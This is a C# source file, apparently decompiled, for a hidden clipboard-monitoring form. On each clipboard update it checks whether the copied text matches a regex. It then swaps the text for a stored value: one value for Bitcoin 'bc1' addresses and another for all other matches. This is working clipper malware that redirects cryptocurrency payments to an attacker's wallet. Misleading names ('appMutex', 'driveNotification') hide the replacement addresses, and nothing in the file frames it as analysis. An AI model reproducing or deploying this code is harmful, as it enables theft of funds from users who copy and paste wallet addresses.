using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace ConsoleApplication7;

public sealed class driveNotification
{
	public class NotificationForm : Form
	{
		private static string currentClipboard = GetText();

		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = ((Form)this).get_CreateParams();
				createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
				return createParams;
			}
		}

		public NotificationForm()
		{
			Program.NativeMethods.SetParent(((Control)this).get_Handle(), Program.NativeMethods.intpreclp);
			Program.NativeMethods.AddClipboardFormatListener(((Control)this).get_Handle());
		}

		private bool RegexResult(Regex pattern)
		{
			if (pattern.Match(currentClipboard).Success)
			{
				return true;
			}
			return false;
		}

		protected override void WndProc(ref Message m)
		{
			if (((Message)(ref m)).get_Msg() == 797)
			{
				currentClipboard = GetText();
				if (currentClipboard.StartsWith("bc1"))
				{
					if (RegexResult(Program.appMutexRegex) && !currentClipboard.Contains(Program.appMutex))
					{
						string text = Program.appMutexRegex.Replace(currentClipboard, Program.appMutex);
						SetText(text);
					}
				}
				else if (RegexResult(Program.appMutexRegex) && !currentClipboard.Contains(Program.appMutex2))
				{
					string text2 = Program.appMutexRegex.Replace(currentClipboard, Program.appMutex2);
					SetText(text2);
				}
			}
			((Form)this).WndProc(ref m);
		}

		public static string GetText()
		{
			string ReturnValue = string.Empty;
			Thread thread = new Thread((ThreadStart)delegate
			{
				ReturnValue = Clipboard.GetText();
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
			return ReturnValue;
		}

		public static void SetText(string txt)
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				Clipboard.SetText(txt);
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
		}
	}
}
